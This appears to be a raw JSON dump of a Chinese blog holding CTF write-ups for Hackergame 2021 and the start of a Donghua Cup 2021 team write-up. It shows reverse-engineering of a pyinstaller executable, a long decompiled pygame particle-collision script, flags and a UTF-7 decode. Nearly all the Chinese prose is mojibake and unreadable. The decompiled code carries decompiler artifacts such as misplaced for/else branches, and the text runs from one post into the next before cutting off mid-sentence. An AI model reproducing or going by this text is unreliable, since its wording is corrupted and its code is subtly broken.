å°±åœ¨ä»–å‘é‡ç”Ÿçš„ GPA æ‰”å‡ºçƒæ—¶ï¼Œä»–å‘ç°ï¼Œè¦æŠ“ä½é‡ç”Ÿçš„ GPAï¼Œè¿œæ²¡æœ‰é‚£ä¹ˆç®€å•â€¦â€¦ ç»å…¸ .gbaï¼Œæ˜¯ä»»å¤©å ‚æ¸¸æˆæœºå•Šï¼ å‚è€ƒ å°ç ´ç«™çš„è§†é¢‘ GBAæ¸¸æˆç”¨ä»€ä¹ˆå§¿åŠ¿ç©ï¼ŸGBAæœ€ä½³è¿è¡Œæ–¹æ¡ˆé›†ç»“ï¼ æˆ‘ä»¬å¯ä»¥ä¹°ä¸ªå®ä½“æœºç„¶ååˆ·è¿›å»ç©ï¼ˆé›¾ å½“ç„¶ï¼Œå–µå–µæ‡’äº†ï¼Œç”¨ Visual Boy Advanceï¼ˆVBAï¼‰æ¨¡æ‹Ÿå™¨æ¥ç©å§ï¼ˆ VisualBoyAdvanceï¼ˆä»¥ä¸‹ç®€ç§°â€œVBAâ€ï¼‰æ˜¯ä¸€ä¸ªæ ¹æ®GNU General Public Licenseå‘å¸ƒçš„å…è´¹è½¯ä»¶ã€‚å®ƒèƒ½å¤Ÿåœ¨ç”µè„‘ä¸Šæ¨¡æ‹Ÿä»»å¤©å ‚æ‰€å‘è¡Œçš„æ‰‹ææ¸¸æˆæœºï¼ŒåŒ…æ‹¬ï¼šGame Boyã€Super Game Boyã€Game Boy Colorå’ŒGame Boy Advanceã€‚ç”±äºVBAæ¨¡æ‹Ÿæ•ˆæœä¸çœŸæ­£çš„GBAåŸºæœ¬æ— å¼‚ï¼Œç›´è‡³2006å¹´æ˜¯Win32ç”µè„‘ä¸Šæœ€å—æ¬¢è¿çš„æ¨¡æ‹Ÿå™¨ã€‚VBAå’Œgnuboyæ˜¯å¹¿æ³›åˆ†å¸ƒçš„Game Boyæ¨¡æ‹Ÿå™¨ï¼Œä¸”VBAå·²æœ‰ä¸­æ–‡åŒ–ç‰ˆæœ¬ã€‚ VisualBoyAdvance-Mï¼ˆæˆ–ç®€ä½œVBA-Mï¼‰æ˜¯ä¸€ä¸ªæ”¹è‰¯åˆ†æ”¯ï¼Œæ¥è‡ªä¸æ´»è·ƒçš„VisualBoyAdvanceé¡¹ç›®ã€‚VisualBoyAdvance-Mä¸­çš„â€œMâ€æ®ä¿¡æ˜¯â€œMergeï¼ˆåˆå¹¶ï¼‰â€çš„ç¼©å†™ã€‚å¦å¤–çš„ç‹¬ç«‹ç‰ˆæœ¬ç§°ä¸ºVBA-ReRecordingï¼Œå®ƒæä¾›äº†å·¥å…·è¾…åŠ©å›æ”¾åŠŸèƒ½ã€‚ via https://zh.wikipedia.org/wiki/Visual_Boy_Advance å¯ä»¥åˆ° SourceForge æˆ–è€… emulator-zone ä¸‹è½½ VBA æˆ–è€… VBA-Mã€‚ æˆ–è€… VBA-M å®˜ç½‘ ä¹Ÿè¡Œï¼Œé‡Œé¢è¿˜æä¾›äº†è¯­è¨€åŒ… Language Filesã€‚ æ‰“å¼€ .gba ï¼ˆTODO â€‹ é©¬èµ›å…‹ å…±äº«å•è½¦åªå‰©ä¸‹ä¸€è¾†ï¼Œèµ°è¿‘ä¸€çœ‹ï¼Œæœç„¶æ˜¯ä¸€è¾†äºŒç»´ç è¢«åäººæ¶‚æ‰ä¸€å¤§å—çš„è½¦ï¼Œè°ä¹Ÿéª‘ä¸èµ°ã€‚ æˆ‘ä»Šå¤©è¿˜éå°±è¦æŠŠè¿™ä¸ªè¾†è½¦éª‘èµ°ã€‚ äºæ˜¯ä½ å¼€å§‹ç ”ç©¶èµ·æ¥è¿™ä¸ªäºŒç»´ç ã€‚ ç‚¹å‡»ä¸‹é¢æŒ‰é’®ä¸‹è½½æºä»£ç ä¸å›¾ç‰‡ https://hack.lug.ustc.edu.cn/media/07ef998b-ea49-51a7-b8ed-8ab733ba0273/mosaic.zip æŸ¥åˆ°äº†è¿™ä¸ªï¼šé»‘å®¢å°†æ‰“äº†é©¬èµ›å…‹çš„äºŒç»´ç è¿˜åŸï¼Œå¹¶æˆåŠŸçªƒå–èµ„é‡‘ ç»å…¸ç¤¾å·¥å•Šï¼ˆ å…¶å®å°±æ˜¯æ ¹æ®å‘¨å›´çš„åƒç´ ç‚¹æ¥æ¨æ–­è¾¹ç¼˜å¤„çš„åƒç´ ï¼Œç„¶åé€æ¸ç¼©å°è¾¹ç•Œï¼Œæœ€åå³ä½¿ä¸èƒ½å®Œå…¨ä¿®å¤ï¼Œä½†å‡­å€ŸäºŒç»´ç çš„å†—ä½™ç‰¹æ€§ï¼Œè¿˜æ˜¯èƒ½è¯†åˆ«å‡ºæ¥çš„ã€‚ ï¼ˆTODO Micro World å®‡å®™ä¸­æŸä¸€ç‰‡æå…¶å¾®å°çš„åŒºåŸŸé‡Œçš„ç²’å­è¢«ä¸€è‚¡ç¥ç§˜åŠ›é‡åˆå§‹åŒ–è®¾ç½®æˆäº† flag çš„å½¢çŠ¶ï¼Œç¨‹åºå¿ å®åœ°è®°å½•äº†ä¸€æ®µæ—¶é—´ä¹‹åè¿™ç‰‡åŒºåŸŸçš„ç²’å­è¿åŠ¨æƒ…å†µã€‚ https://hack.lug.ustc.edu.cn/media/6f3f9a71-a6a3-5393-ab90-57080553a279/microworld.exe åˆæ˜¯ pyinstaller æ‰“åŒ…çš„ï¼Œpython38ï¼Œæ²¡æœ‰åŠ å¯†ï¼Œå¾ˆèˆ’æœã€‚ å¯ä»¥çœ‹çœ‹å’±å†™çš„ 2021 ç½‘ä¿¡æŸé¹­æ¯ Reverse baby_python ä¸€é¢˜ Writeup python3 pyinstxtractor.py microworld.exe æ ¹æ® struct.pyc æŠŠ 2.pyc æ–‡ä»¶å¤´æ”¹ä¸€ä¸‹ uncompyle6 2.pyc &gt; 2.py æ ¹æ®æç¤ºï¼Œåˆå§‹åŒ–è®¾ç½®æˆäº† flag çš„å½¢çŠ¶ï¼Œä¸€æ®µæ—¶é—´ä¹‹åè¿™ç‰‡åŒºåŸŸçš„ç²’å­è¿åŠ¨æƒ…å†µï¼Œè¯´æ˜è¿™ä¸ªæ•°æ®æ˜¯è¿›è¡Œäº†ä¸€æ®µæ—¶é—´çš„è¿åŠ¨åçš„ï¼Œè¦æ¢å¤å›å»ã€‚ å½“å‰çš„çŠ¶æ€å¦‚ä¸‹ï¼ˆæ²¡å•¥ç”¨çœ‹èµ·æ¥ ç„¶è€Œå‘ç°åç¼–è¯‘ä¹‹åè·‘è¿™ä¸ª 2.pyï¼Œåªå‰©ä¸€ä¸ªç‚¹åœ¨åŠ¨äº†ï¼Œå¥½å¥‡æ€ªå•Šâ€¦â€¦ æŠ˜è…¾äº†å¥½ä¸€é˜µå­éƒ½æ²¡æå®šï¼Œç”šè‡³å¼€å§‹ç ”ç©¶èµ·è¿™æ˜¯å•¥è¿åŠ¨ï¼Œè§‰å¾—è¿˜æ˜¯ä¸å¯¹åŠ²å•Šã€‚ æœ€åæ¢äº†ä¸ªåç¼–è¯‘çš„å·¥å…·ï¼Œç”¨äº† python-decompile3 è¿™ä¸ªï¼Œå¯¹æ¯”ä¸€ä¸‹ã€‚ decompyle3 2.pyc &gt; 22.py éš¾æ€ªï¼Œuncompyle6 æŠŠè¿™ä¸ªå¾ªç¯ä½ç½®æé”™äº†å•Šâ€¦â€¦ï¼ˆç»ç»å­ æºç å¦‚ä¸‹ã€‚ # decompyle3 version 3.7.6 # Python bytecode 3.8.0 (3413) # Decompiled from: Python 3.7.3 (default, Mar 27 2019, 17:13:21) [MSC v.1915 64 bit (AMD64)] # Embedded file name: 2.py # Compiled at: 1995-09-28 00:18:56 # Size of source mod 2**32: 272 bytes import time, pygame, random, math WIDTH = 800 HEIGHT = 480 FPS = 30 RADIUS = 6 WHITE = (255, 255, 255) BLACK = (0, 0, 0) RED = (255, 0, 0) GREEN = (0, 255, 0) BLUE = (0, 0, 255) pygame.init() pygame.mixer.init() screen = pygame.display.set_mode((WIDTH, HEIGHT)) pygame.display.set_caption('Micro world') clock = pygame.time.Clock() running = True count = 0 list_ = [ (104.57999766036382, 294.30576115498934, 0.1577677901040423, 0.41776948474620357), (97.87091160071468, 284.0771467313936, -0.05370797410649919, -1.5117973702589511), (394.1386262922653, 342.409197651039, 1.257922260374631, -0.6461638773589035), (383.764164219779, 351.02042667556873, 0.20006041825672996, 0.6886413335669115), (180.44019240845162, 133.7535956479616, -1.2484762435639396, -0.24929662016190135), (184.78982911642964, 145.40211792122318, -0.0022636999589985274, 0.5513600856872762), (115.03335937165885, 300.9993063319222, -0.5676054221924623, -0.6695938101055833), (428.3301722808014, 85.83680504269783, -0.0513590947698387, 0.2619177140188991), (421.5916683285764, 72.17809124687787, 0.2014421765254144, -1.4100046681437837), (162.58901945971377, 126.99241616764206, 0.030293407742100736, -0.8004786559033131), (160.9895035322225, 145.70895141366148, 0.34929641702611086, 1.0244323100199488), (99.54962866775641, 349.46917135540673, 0.8725254958889044, 0.18026779894381553), (113.4935960089335, 350.07171367926867, 1.3948726673436584, -0.054645034381742424), (243.53937023444496, 324.4815163708293, 0.7754113027163299, -0.35104389069767705), (236.07107039080046, 336.93661006373446, 0.48878994205902065, 0.3668410462786823), (142.25100857351947, 107.18317281548164, 0.8769918696942771, 0.3381787797086514), (126.65532126550701, 101.44841747837386, -0.23643662821636835, -0.7474233162903591), (93.89796091125481, 337.69531331910224, 1.0011924240124088, 0.3786722871573705), (80.48068970171919, 325.1970583485235, -0.7399280117105376, -0.1701776000030069), (562.4548633698985, 293.8157173337281, 0.9232890949122534, -0.6707164772798287), (544.2230504332125, 298.5096170399827, -0.45781767619323493, 0.20143165105280758), (591.0728484545633, 384.0271820277358, -0.3546100658269741, -0.11818203300203947), (587.8300731972232, 397.21466538385005, 0.1658293862635661, 0.42343564083856233), (160.96290809954047, 113.1243147430774, 0.3297720052539864, -0.9088842057483848), (341.609111706211, 174.90102865131772, -0.6451128281395191, 0.6625764312805231), (361.89732768708996, 171.7398998209568, 0.9626383465113062, -0.45377732846689295), (413.2372099784884, 109.2059457838029, 0.06068110806079574, 0.7460129288950222), (428.03790114833487, 103.0981885607253, 0.7102816563423606, 0.5965135218875973), (632.823035103914, 183.41308729879773, 0.9426699419434019, -0.17948947163331008), (619.693443152725, 171.6281942118759, -0.4050225991049363, -0.3004630650084027), (234.93804029190275, 314.4850986917503, 0.6079647151190387, -0.3527147434952942), (388.84210326921414, 329.1140520966929, -0.25641606835531666, 0.013640064895390436), (431.54831561818656, 328.2835752571257, 0.0862740779218544, 0.30203328636401916), (449.4737324005318, 318.59090969779714, 0.8493162548457772, -0.39087008306977955), (414.9662287493531, 321.7992369591167, -0.38427287382474645, -0.8225562013945713), (393.14019608044197, 166.3219823104028, -0.8606903726780473, 0.44501048112586244), (407.74279750683405, 174.07932270043037, -0.41221110195676625, 0.5621672919603494), (459.79766287684146, 367.8798142900581, -0.013886373621122439, -0.3180180360181074), (481.3079661009345, 389.2929845754805, 1.308536261884114, 0.6279064260682542), (299.0319011022105, 142.56295134440845, 0.5129247847316193, 0.6861624164039957), (284.8757848267405, 115.44737423970206, -0.39395187391162256, -0.7247085199267874), (721.0242237005709, 208.11018311759165, 0.5031252275481168, 0.45273074175310746), (698.5559327045538, 206.46532762419102, -0.4253037092008059, -0.10234863067289382), (238.01728536837834, 96.94484935393817, -1.0004911938691854, -0.649305316642717), (231.42367571047265, 113.24222441346936, -1.0247825937879875, -0.17624171000468863), (219.78600179605175, 374.1104577170864, -0.6368728728325652, -0.17569384553335526), (246.11065722883504, 371.79606791842366, 0.5219343181987446, -0.3462866864847798), (61.288999430029705, 325.3049764118085, 0.06327048049117068, 0.43129466994014554), (44.508614390256625, 300.0898728637909, -0.6949149408422702, -0.6606674558084397), (444.7436476698611, 97.43495673585237, 0.0767541318435591, -0.2776251496223229), (744.2355976846196, 142.86962390689527, 0.9981335574540283, -0.24606523573449057), (722.4382189578434, 148.50423479439266, 0.17497076263720399, -0.184532590143744), (418.5327228664219, 136.72695351434712, 0.5475576395865829, -0.8913163462276698), (695.9021288583592, 180.5828160193858, -0.9488479900701872, -0.7148885273332122), (514.3530295181225, 176.69505705865964, 0.4250410294309581, 0.24872469962151272), (491.3217475016306, 192.06501755019133, -0.5852344731438237, 0.6683151007063167), (404.93366351040646, 355.33847789785887, -0.2208752264067056, 0.5785115096521176), (660.6042829909404, 388.98594646068375, -0.2802404219269444, -0.8854758825918975), (657.1412902684084, 422.0142602600062, -0.09955316106014461, 0.6262242796545058), (324.601539532362, 71.99880574130555, -0.44523640628825367, -0.7982939572849916), (313.7688791782026, 100.51158011600064, -0.8550429986673138, 0.23687636012864005), (463.05020279897207, 354.3841115016863, 0.5259364738387711, -0.030002820893658896), (307.8633146779248, 151.5952286725273, 0.6622908641009807, -0.03664136082024409), (398.41892028466214, 111.78772135693538, 0.11954324115479029, -0.8254277998217231), (381.45123257781245, 136.6036806395423, -0.6799079499520264, -0.08600175586428575), (292.6839863142225, 92.60685790044825, 0.536452531252875, -0.7140993636579337), (107.00966574475697, 373.9070654764243, -0.7010200558637464, -0.1381120246392485), (145.16889322345122, 365.860466913724, 0.5965222398714648, -0.5001275164663491), (353.3938458530145, 92.28564527857638, 0.27648661676701847, 0.4055937158607218), (332.6003342739462, 150.35292606144606, 0.16791054337808475, 0.19838069473157122), (333.2155442174266, 135.41367942003444, -0.1948746996045789, -0.8713050639597644), (341.7828985904844, 176.40085292375244, 0.15777998878645658, 0.45702848410002833), (352.9649338991208, 63.40320810353417, 0.31005939791813875, -0.35531540613337653), (558.759849975508, 335.82850463010334, -0.3751838713627865, 0.6972047893312435), (658.9879897953409, 243.4647341215956, -0.2407221233734072, -0.9276449712809698), (680.2245351443412, 296.75251078114536, 0.4337786026208906, 0.9727281158269319), (341.72634396514303, 378.7867598373575, -0.03596521226118493, 0.51167641447653), (697.0597317905844, 409.2588838533252, 0.9048830590914927, -0.4657488561253242), (665.1731546911783, 437.3925803649936, -0.007368744952089001, 0.3787660493964195), (67.00785464657952, 103.1274278061125, 0.03732794987331456, -0.5508360071810254), (105.96964960562794, 128.97178091353496, 0.8136907261343687, 0.4063622560568454), (105.07041437177854, 61.05750261646497, 0.26186719895475497, -0.5163887919827821), (68.49603305059723, 73.94521027290915, -0.7594061833112205, -0.7798070269292883), (71.34190872889897, 124.87773643827933, -0.4688181952259638, -0.5600838356192892), (64.27757202298889, 159.8496885573903, -0.6934232584078162, -0.042604127504053846), (70.57044794264237, 176.93801328964406, -0.4233167428650957, -0.11340691519836832), (144.63770817171127, 69.41378490162104, -0.08749228993661817, -0.28097092956958947), (137.8210753472867, 150.33804975066357, -0.191812024174572, 0.6051129537282753), (137.26460390655052, 180.16854638211603, -0.21242207753516196, 0.11735356970799926), (165.50112593068218, 175.5434604690403, 0.3148565159511876, -0.3132051678133363), (158.21970276683984, 160.0662466663162, -0.399270267894807, -0.47902790124753714), (162.68670402259963, 93.7322224457243, -0.9745665176814846, -0.9728806501583553), (200.74175804924195, 121.50562533623162, -0.6762311833614205, -0.2034953579173453), (224.47067029408507, 148.9360402550957, 0.46187667755869377, -0.22459110166312768), (249.5998504282539, 128.78709867759278, 0.8740685343797732, -0.6745519008298879), (222.1623163178933, 162.24461613732666, -0.40139569192986624, 0.04609689397505523), (270.1496673364134, 119.26292107574434, 0.44998767912644677, -0.8791510712687354), (251.7055547368385, 167.7628397486525, -0.9368313060430262, 0.6578829536537905), (275.1172494773191, 184.09798794704585, -0.5141759452844961, -0.033407853813111066), (265.9957830031348, 199.51750836889886, -0.25941544432835606, 0.056204013662934704), (282.07956665413514, 164.958740535395, 0.8918358020049804, -0.7422688690594414), (353.4402011639725, 114.78109493306745, 0.7570444875545246, -0.415515002478986), (356.5222794940665, 213.68778310329276, 0.6860103516321112, 0.9143623371590044), (330.49971249176855, 226.5949460000718, -0.6111217595640996, 0.873886888891541), (454.61901786077544, 150.71441166327446, 0.8747784392879676, 0.9153485801212855), (388.60627446909075, 197.93977442346403, -0.23680464929294276, 0.14591757123939741), (423.67540627845943, 205.2755085720821, -0.5305405082052022, 0.8620558730400902), (477.52821141998515, 197.94782386045253, 0.8714152377772004, -0.11304356072398081), (509.7764508897392, 142.38940000013736, -0.3416129300096671, 0.4959037037087939), (517.4542284218678, 157.00198576512298, -0.8720656140048659, 0.7778513246341929), (489.14570184081595, 143.71628106431027, -0.43904807996975315, 0.17467707645594244), (484.36624455679043, 162.18554614981508, -0.3197687201188777, 0.006872079622769922), (538.1915570784884, 186.90845701394394, 0.2663539658698997, 0.9595724819979277), (558.4402698588482, 151.2562488554182, 0.20149147625361707, -0.1756944868363639), (498.8936687068798, 219.16941966684988, -0.522456714559989, 0.747015543216671), (557.5264047150413, 194.47492406099926, 0.686163137594151, -0.13055836811114152), (572.2642293852141, 133.05544915189392, -0.36058409684388026, 0.18723885747756386), (593.233462901164, 148.90845332339745, 0.11975788522826214, -0.04042765468897547), (592.1067952919601, 200.97587238888386, -0.2553038780755985, 0.7398471255142076), (620.8001885800545, 156.51793210692475, -0.5999930155535687, 0.3525160039601669), (630.0497687231773, 138.21403356381515, -0.7018604176601002, 0.3042234653264848), (656.2600646659411, 156.841032404578, -0.9903679753354846, 0.7348530520214087), (711.2887269504378, 97.8513508705996, 0.3810639611272786, -0.8943944122000136), (738.7664844418454, 116.88118100970506, 0.6209809052535715, -0.41180811075166335), (703.8040510631283, 152.5920657076647, 0.511261150486223, -0.5706642330494665), (740.09107559372, 198.6981029696348, 0.5218916886562541, 0.1740038136901716), (657.6864804602145, 215.93482850112167, -0.9745747977698767, 0.034623277819314735), (71.54711083768379, 350.36060634700226, 0.6498929939882905, -0.6162738389999025), (150.9033697831391, 276.73234512286984, 0.9223470290051474, 0.582679448995163), (172.75073798985846, 238.05776406669546, 0.9907680736984741, -0.886749479011274), (166.14454393170783, 261.9146208279891, -0.10575763215896572, -0.04019922859299774), (135.8179319546022, 304.5167891568187, 0.51177525757786, 0.6117329317340197), (109.29600036825342, 324.14080376797784, -0.32237035673135206, -0.47626652711191975), (128.25054047146125, 342.5039087606924, 0.41668668412819376, -0.6480033792336315), (160.9435843133916, 336.7772890102673, 0.22013275234783625, 0.4732329263061923), (159.99063987213424, 357.3713520468878, 0.14780147674570876, -0.8751351093745308), (203.82463986148133, 294.85292265982395, 0.36387555042522823, -0.8943361977843205), (238.77834673828744, 257.8957469467245, 0.69549432364027, -0.966824187158376), (234.71098679446786, 302.43763534262735, 0.6189254368321369, -0.02082832064340412), (199.13592069493149, 350.92258754952445, -0.5134844187062317, -0.2621263870546515), (246.08239218788768, 387.5706266290919, 0.5215700810328909, -0.12701382855216137), (279.81163336690304, 310.1193743783627, -0.5995691345591287, 0.8192360880875091), (312.43826713316605, 326.3110183009928, 0.6088247086357645, -0.02551784070396379), (278.3124563204679, 346.2774946054354, -0.618057173316024, 0.23249980020133165), (309.0606334597058, 364.2832298989901, 0.5578012392483811, 0.34382332959224393), (277.86613144487796, 384.4110746203211, -0.5605136501896855, 0.422632393345197), (297.7963837815137, 417.4215462126431, 0.1776438437597616, 0.978575785653446), (308.64648313310744, 389.32195957645587, -0.8279080321071313, 0.048961465794687076), (332.9030266443413, 352.59935912758954, -0.9665545687281056, 0.614791078799594), (348.26013943242486, 314.11612768512305, -0.842217058058359, -0.032736011662137576), (360.3306887191309, 292.2383422919451, -0.7655300474395692, -0.32450584103905666), (396.9404109804546, 370.8911519658965, -0.15035514887206558, -0.04106844570751811), (400.104874692782, 411.57211198606, -0.1442639002673347, 0.761930073557795), (440.30114216085207, 361.3409051871098, 0.9000423022537898, -0.2836701782551865), (429.3543769941238, 341.9294444418788, 0.3094213701527606, -0.33594650215266264), (447.43603366759595, 277.2285471339229, 0.38651976546653843, -0.880424180225089), (481.7939322275633, 301.5421301772078, -0.15578028786801723, -0.09103221565894848), (496.05798504633856, 291.5141421831062, -0.0719264797652579, -0.09206880803313222), (509.5366997343411, 286.81707674748407, -0.16530741724662823, 0.14137321286975357), (512.6359971378648, 331.33312820778906, -0.7542223282272489, 0.9012269706588789), (565.2777793457861, 322.789250206497, -0.8786007649708629, 0.6588611187591347), (616.2993903993898, 307.1147976370016, 0.30738482960705515, 0.07832583840747809), (549.4707698926467, 355.7327131244734, -0.6862677817538163, 0.5086190046101378), (566.0048628120813, 359.0888370802809, -0.8146347106636107, 0.521808780751152), (603.0173174232779, 355.65724327656727, -0.22158083617492497, 0.09841641765061859), (627.8321653818715, 343.97419893606997, 0.4011913104396747, -0.9268815208862793), (537.4339433151019, 408.0628758894442, -0.9839280253666145, 0.5949213292386479), (640.8558916665046, 286.24303230003744, -0.30163364198134635, 0.3052974925939915), (693.3776564065166, 322.7209553086005, 0.6806539409820418, 0.8785539003185334), (677.9197897159304, 332.5251925812629, 0.1451773968863177, 0.42685898449123116), (715.7380915196851, 359.6720022622894, 0.8791885748031647, 0.9508148986033234), (654.241096201209, 350.8310224121308, -0.8058853258811696, 0.25300083007890595), (660.0062961624873, 367.58093595080226, -0.6293964384264055, 0.09559022040005982), (674.0852620040955, 376.20299215975325, -0.07091622207048798, -0.362852142231338)] class Point: def __init__(self, pos, vx, vy): self.x, self.y = pos self.vx = vx self.vy = vy self.flag = 1 def dotproduct(v1, v2): return v1[0] * v2[0] + v1[1] * v2[1] def checkcrush(point1, point2): distance = math.sqrt((point1.x - point2.x) ** 2 + (point1.y - point2.y) ** 2) a = (point1.vx - point2.vx) ** 2 + (point1.vy - point2.vy) ** 2 b = 2 * (point1.x - point2.x) * (point1.vx - point2.vx) + 2 * (point1.y - point2.y) * (point1.vy - point2.vy) c = distance ** 2 - 4 * RADIUS ** 2 delta = b ** 2 - 4 * a * c if delta &lt; 0: return time = (-b - math.sqrt(delta)) / (2 * a) if time &gt; 0: if time &lt; 1: return time return def get_new_point(time, point1, point2): distance = math.sqrt((point1.x - point2.x) ** 2 + (point1.y - point2.y) ** 2) standard_displacement = ((point2.x - point1.x) / distance, (point2.y - point1.y) / distance) v_1 = (point1.vx, point1.vy) v_2 = (point2.vx, point2.vy) v_par_1 = dotproduct(standard_displacement, v_1) v_par_2 = dotproduct(standard_displacement, v_2) v_ver_1 = (point1.vx - v_par_1 * standard_displacement[0], point1.vy - v_par_1 * standard_displacement[1]) v_ver_2 = (point2.vx - v_par_2 * standard_displacement[0], point2.vy - v_par_2 * standard_displacement[1]) v_after_par_1 = v_par_2 v_after_par_2 = v_par_1 v_after_1 = (v_after_par_1 * standard_displacement[0] + v_ver_1[0], v_after_par_1 * standard_displacement[1] + v_ver_1[1]) v_after_2 = (v_after_par_2 * standard_displacement[0] + v_ver_2[0], v_after_par_2 * standard_displacement[1] + v_ver_2[1]) afterpos_1 = (point1.x + point1.vx * time + v_after_1[0] * (1 - time), point1.y + point1.vy * time + v_after_1[1] * (1 - time)) afterpos_2 = (point2.x + point2.vx * time + v_after_2[0] * (1 - time), point2.y + point2.vy * time + v_after_2[1] * (1 - time)) return ( Point(afterpos_1, v_after_1[0], v_after_1[1]), Point(afterpos_2, v_after_2[0], v_after_2[1])) def drawpoint(screen, list_): for item in list_: pygame.draw.circle(screen, BLUE, (round(item.x), round(item.y)), RADIUS, 3) def next_pos_list(Pointlist): pointlist = [] for i in range(len(Pointlist)): for point in Pointlist[i + 1:]: times = checkcrush(Pointlist[i], point) if times != None: a, b = get_new_point(times, Pointlist[i], point) pointlist.extend([a, b]) Pointlist[i].flag = 0 point.flag = 0 else: for item in Pointlist: if item.flag != 0: pointlist.append(Point((item.x + item.vx, item.y + item.vy), item.vx, item.vy)) else: for poi in pointlist: poi.x = poi.x % WIDTH poi.y = poi.y % HEIGHT else: return pointlist Pointlist = [] for item in list_: Pointlist.append(Point((item[0], item[1]), item[2], item[3])) else: def value(lis): count = 0 for item in lis: count = count + (item.x - round(item.x)) ** 2 + (item.y - round(item.y)) ** 2 else: return count while True: if running: clock.tick(FPS) for event in pygame.event.get(): if event.type == pygame.QUIT: running = False else: screen.fill(BLACK) drawpoint(screen, Pointlist) Pointlist = next_pos_list(Pointlist) pygame.display.flip() pygame.quit() # okay decompiling 2.pyc é‚£å°±æŠŠé€Ÿåº¦æ”¹æˆè´Ÿçš„ï¼Œç„¶åå€’ç€è¿åŠ¨å›å»å°±å®Œäº‹äº†ï¼Œä¹Ÿå°±æ˜¯åˆå§‹åŒ–ç‚¹çš„åæ ‡åˆ—è¡¨è¿™é‡Œã€‚ Pointlist = [] for item in list_: Pointlist.append(Point((item[0], item[1]), -item[2], -item[3])) è·‘ä¸€ä¸‹ï¼Œå¾—åˆ° flagã€‚ flag{Rev3sEtiM^5} å°ç»“å•Šï¼ä»Šå¹´çš„ Hackergame å°±è¿™ä¹ˆç»“æŸå•¦ï¼ u1s1ï¼Œä»Šå¹´ é¢˜ç›®å¾ˆæœ‰æ¢¯åº¦ï¼ŒåŸºç¡€çš„å¾ˆèƒ½åˆ’æ°´ï¼Œä¸­ç­‰çš„é¢˜ç›®èƒ½æ‘¸æ‘¸é±¼ï¼Œæœ‰äº›é¢˜ç›®è¿˜æ˜¯æŒºéš¾çš„ï¼Œç„¶è€Œå–µå–µè¿™å‘¨å¿™äºä½œä¸šã€å…¶ä»–æ¯”èµ›ã€balabalaï¼Œè¿˜æœ‰å¥½å‡ é¢˜è§‰å¾—æœ‰ç‚¹æ€è·¯çš„æ²¡æ¥å¾—åŠçœ‹äº†ã€‚ æ‘¸äº†æ‘¸äº†ï¼Œå’±è¿˜æ˜¯æ¥å­¦ä¹ ä¸ºä¸»ï¼Œ2333 å®Œç»“ æ’’èŠ±ï¼Œæ’’ mcfxï¼ æ„Ÿè°¢æ‰€æœ‰å¹•åå·¥ä½œäººå‘˜ï¼Œå–µå–µä»Šå¹´ä¹Ÿå­¦åˆ°äº†è®¸å¤šï¼Œæ˜å¹´æœ‰æœºä¼šä¸€å®šå†æ¥ã€‚ å…¶ä»–èµ„æº å®˜æ–¹é¢˜è§£ repoï¼š hackergame2021-writeups ï¼ˆè¿™ wp å†™å¾—å¯è‰¯å¿ƒäº†ï¼Orz Hackergame 2021 å¹•åå·¥ä½œäººå‘˜ èŠ±çµ® æ¦œä¸€ mcfx çš„å…¨éƒ¨ wpï¼šHackergame 2021 Writeup æˆ–è€… GitHub (mcfx! Orz! GZTimeâ€™s writeup: Hackergame 2021 Summary ranwenâ€™s writeup: USTC Hackergame 2021 åˆ’æ°´è®° æˆ–è€… GitHub etc. é¡ºä¾¿æ”¾å‡ ä¸ªæ¢—ï¼ˆ ï¼ˆæºœäº†æºœäº†å–µ~","path":"2021/11/03/CTF_2021Hackergame/"},{"title":"CTF | 2021 ä¸œåæ¯ å¤§å­¦ç”Ÿç½‘ç»œå®‰å…¨é‚€è¯·èµ› WriteUp","text":"æœ¬æ–‡é¦–å‘äºå®‰å…¨å®¢ï¼šhttps://www.anquanke.com/post/id/258197 å¼•è¨€ â€œä¸œåæ¯â€2021å¹´å¤§å­¦ç”Ÿç½‘ç»œå®‰å…¨é‚€è¯·èµ›æš¨ç¬¬ä¸ƒå±Šä¸Šæµ·å¸‚å¤§å­¦ç”Ÿç½‘ç»œå®‰å…¨å¤§èµ› æ¯”èµ›æ—¶é—´: 2021-10-31 09:00 ~ 2021-10-31 21:00 æ¯”èµ›å®˜ç½‘: https://www.ichunqiu.com/2021dhb åæœˆå°±è¦ç»“æŸäº†ï¼Œè¿™ä¸ªæ¯”èµ›å°±æ˜¯åæœˆä»½çš„æœ€åä¸€ä¸ªæ¯”èµ›å•¦~ è¿™æ¯”èµ›å¾€å¹´ç›¸å¯¹å…¶ä»–æ¯”èµ›æ¥è¯´éƒ½æŒºç®€å•çš„ï¼Œä¸èƒ½è·¨æ ¡ç»„é˜Ÿï¼Œäºæ˜¯å°±æ‹‰ä¸Šæ ¡å†…çš„å­¦å¼Ÿéšæ„ç»„äº†ä¸ªé˜Ÿæ¥æ‰“äº†ã€‚ ä»æ—©ä¹å¼€å§‹æ‰“ï¼Œç„¶è€Œå–µå–µä¸­åˆæ‰èµ·æ¥ï¼Œæ‘¸äº†.jpgï¼Œè¿˜å¥½è¿˜èƒ½åšå‡ é¢˜ï¼Œä¸ç„¶å°±å½»åº•æ‘¸é±¼äº†ï¼ˆè™½ç„¶ç­¾ä¸ªåˆ°ä¹Ÿèƒ½è¿›å†³èµ›ï¼Œé€ƒ è¿™ç¯‡æ˜¯å›¢é˜Ÿçš„ writeup å•¦~ Reverse é¢˜ç›®æ˜¯é˜Ÿå‹åšçš„ã€‚å–µå–µä¹Ÿæƒ³å­¦ REï¼Œå‘œå‘œã€‚ Misccheckin +AGYAbABhAGcAewBkAGgAYgBfADcAdABoAH0- s = b\"+AGYAbABhAGcAewBkAGgAYgBfADcAdABoAH0-\" s.decode('utf-7') # 'flag{dhb_7th}' ï¼ˆä¸€çœ‹åˆ°è¿™ä¸ªå¼€å¤´çš„ + å°±æƒ³åˆ° 2020 USTC Hackergame é‚£ä¸ª utf-7 çš„é¢˜ç›® äº† project ä¸€ä¸ªæ™®æ™®é€šé€šçš„å·¥ç¨‹æ–‡ä»¶ é™„ä»¶ä¸‹è½½ æå–ç ï¼ˆGAMEï¼‰å¤‡ç”¨ä¸‹è½½ è§£å‹å‡ºæ¥ä¸€å †çš„è¿œå¤æ–‡ä»¶ï¼Œå‘ç°æ˜¯ ç»„æ€ç‹ï¼ˆKingViewï¼‰ï¼Œæ„Ÿè§‰æ˜¯å·¥æ§çš„é¢˜ã€‚ å†ä¸€çœ‹ä¿®æ”¹æ—¶é—´ï¼Œåªæœ‰ä¸€ä¸ªä»Šå¹´çš„ test.exeï¼Œä¸€çœ‹å°±æ˜¯ pyinstaller 